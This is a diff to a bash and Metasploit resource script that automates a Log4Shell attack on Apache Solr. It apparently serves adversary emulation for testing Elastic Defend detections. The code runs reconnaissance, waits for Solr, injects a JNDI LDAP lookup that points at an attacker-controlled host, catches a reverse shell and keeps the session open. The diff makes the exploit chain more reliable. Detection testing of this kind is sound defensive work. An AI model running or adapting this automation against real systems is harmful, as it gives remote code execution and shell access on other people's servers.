@@ -24,6 +24,14 @@
 
 set -euo pipefail
 
+# --- Pre-flight: verify required tools ---
+for cmd in nmap curl python3 msfconsole; do
+    if ! command -v "$cmd" &>/dev/null; then
+        echo "FATAL: Required tool '$cmd' not found. Install it before running this script."
+        exit 1
+    fi
+done
+
 # Defaults
 LPORT=4444
 PERSISTENCE_PORT=4445
@@ -120,13 +128,45 @@ show_cmd() {
 WORKDIR="/tmp/host-scan-$$"
 mkdir -p "$WORKDIR"
 
-# Clean up previous runs
+# Clean up previous runs and ensure clean exit
 cleanup() {
     pkill -9 msfconsole 2>/dev/null || true
     pkill -9 -f "nc.*${LPORT}" 2>/dev/null || true
     pkill -9 -f "nc.*${PERSISTENCE_PORT}" 2>/dev/null || true
     rm -f /tmp/host-scan.rc 2>/dev/null || true
     sleep 1
+}
+
+trap 'cleanup; rm -rf "$WORKDIR" 2>/dev/null || true' EXIT
+
+# Wait for Solr to be fully operational (API returns valid JSON)
+wait_for_solr() {
+    local target="$1"
+    local max_attempts=30
+    local attempt=0
+    log "Waiting for Solr on ${target}:8983 to be ready..."
+    while [ $attempt -lt $max_attempts ]; do
+        if curl -sf --connect-timeout 3 "http://${target}:8983/solr/admin/info/system" 2>/dev/null | \
+           python3 -c "import sys,json; json.load(sys.stdin)" >/dev/null 2>&1; then
+            log "${GREEN}Solr on ${target} is ready.${NC}"
+            return 0
+        fi
+        sleep 2
+        ((attempt++))
+    done
+    log "${RED}WARNING: Solr on ${target} not ready after ${max_attempts} attempts.${NC}"
+    return 1
+}
+
+# Ensure ports needed for exploitation are free
+free_ports() {
+    for port in ${LPORT} ${PERSISTENCE_PORT} 1389 8080; do
+        if ss -tuln 2>/dev/null | grep -q ":${port} "; then
+            log "${YELLOW}Port ${port} in use — killing previous process...${NC}"
+            fuser -k "${port}/tcp" 2>/dev/null || true
+            sleep 1
+        fi
+    done
 }
 
 # --- Banner ---
@@ -196,6 +236,13 @@ if [[ "$SKIP_RECON" == "false" ]]; then
     # Step 2: Fingerprint services via API
     phase "1b" "SERVICE FINGERPRINTING" "T1592.002 - Gather Victim Host Information: Software" \
         "Querying Solr admin API on each discovered host."
+
+    # Ensure Solr is ready on discovered hosts before fingerprinting
+    for host in "${LIVE_HOSTS[@]}"; do
+        if grep -q "${host}.*8983/open" "${NMAP_OUTPUT}" 2>/dev/null; then
+            wait_for_solr "$host"
+        fi
+    done
 
     for host in "${LIVE_HOSTS[@]}"; do
         # Only probe hosts with 8983 open
@@ -309,6 +356,8 @@ else
     phase "1" "TARGET VERIFICATION" "T1592.002 - Gather Victim Host Information: Software" \
         "Fingerprinting target service."
 
+    wait_for_solr "$TARGET_IP"
+
     show_cmd "curl -s http://${TARGET_IP}:${EXPLOIT_PORT}/solr/admin/info/system | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f'Solr: {d[\\\"lucene\\\"][\\\"solr-spec-version\\\"]}, Java: {d[\\\"jvm\\\"][\\\"version\\\"]}')\"" 2
 
     if curl -s --connect-timeout 5 "http://${TARGET_IP}:${EXPLOIT_PORT}/solr/" > /dev/null 2>&1; then
@@ -375,9 +424,27 @@ def run_cmd(cmd, session_id)
   sleep(0.5)
 end
 
-# Wait for the LDAP and HTTP servers to start
+# Wait for the LDAP and HTTP servers to start (verify ports are listening)
 puts "\033[0;35m[host-scan]\033[0m Waiting for LDAP/HTTP servers to start..."
-sleep(8)
+require 'socket'
+[1389, 8080].each do |port|
+  ready = false
+  20.times do
+    begin
+      s = TCPSocket.new('127.0.0.1', port)
+      s.close
+      ready = true
+      break
+    rescue
+      sleep(1)
+    end
+  end
+  if ready
+    puts "\033[0;35m[host-scan]\033[0m   Port #{port} is listening."
+  else
+    puts "\033[0;35m[host-scan]\033[0m \033[0;31m  WARNING: Port #{port} not listening after 20s\033[0m"
+  end
+end
 
 # Inject JNDI payload via Solr query parameter (which IS logged by Log4j)
 jndi_str = "\${jndi:ldap://${ATTACKER_IP}:1389/exploit}"
@@ -396,10 +463,12 @@ rescue => e
 end
 
 # Wait for the target to process JNDI lookup -> LDAP -> HTTP -> reverse shell
-30.times do |i|
+120.times do |i|
   sleep(1)
   break if framework.sessions.count > 0
-  print "." if i % 5 == 4
+  if (i + 1) % 10 == 0
+    puts "\033[0;35m[host-scan]\033[0m   [#{i + 1}s] Waiting for reverse shell..."
+  end
 end
 puts ""
 
@@ -425,9 +494,19 @@ puts "\033[0;35m#{'=' * 80}\033[0m"
 puts ""
 puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
 puts ""
+puts "\033[0;35m[host-scan]\033[0m Keeping session open — press Ctrl+C to exit."
+puts ""
+
+# Keep the session alive so detection rules have time to fire
+loop do
+  sleep(10)
+  if framework.sessions.count == 0
+    puts "\033[0;35m[host-scan]\033[0m Session closed (likely killed by Elastic Defend)."
+    break
+  end
+end
 </ruby>
 
-sessions -K
 jobs -K
 exit
 RCEOF
@@ -436,6 +515,9 @@ RCEOF
     # --- Run the exploit ---
     log "Cleaning up previous sessions..."
     cleanup
+
+    log "Ensuring required ports are free..."
+    free_ports
 
     log "Building Metasploit resource script..."
     build_rc
@@ -458,6 +540,3 @@ fi
 
 echo ""
 log "${GREEN}Attack complete.${NC}"
-
-# Cleanup working directory
-rm -rf "$WORKDIR"
